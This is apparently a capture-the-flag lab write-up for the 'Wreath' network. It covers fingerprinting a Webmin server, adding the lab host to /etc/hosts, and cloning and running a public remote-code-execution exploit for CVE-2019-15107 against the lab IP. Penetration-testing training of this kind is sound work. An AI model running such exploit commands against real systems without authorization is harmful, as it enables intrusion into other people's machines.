Based on the headers of the webserver, we can deduce that centos is the OS on the machine.\
\
Attempting to access the web page via IP address does not work. DNS is not configured. We can see the domain in the port scan\
\
(https://thomaswreath.thm)\
\
We add this to our /etc/hosts file

```bash
10.200.84.200	thomaswreath.thm
```

Looking at port 10000, we see that it is running **MiniServ 1.890 (Webmin httpd)**


Google search reveals there is a RCE exploit for this: **CVE-2019-15107**


We can use the exploit found here:
https://github.com/MuirlandOracle/CVE-2019-15107


Clone the repo and then install the required python libraries
```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107

pip3 install -r requirements.txt
```

The script can now be run:
```bash 
python3 CVE-2019-15107.py -p 10000 10.200.84.200
```
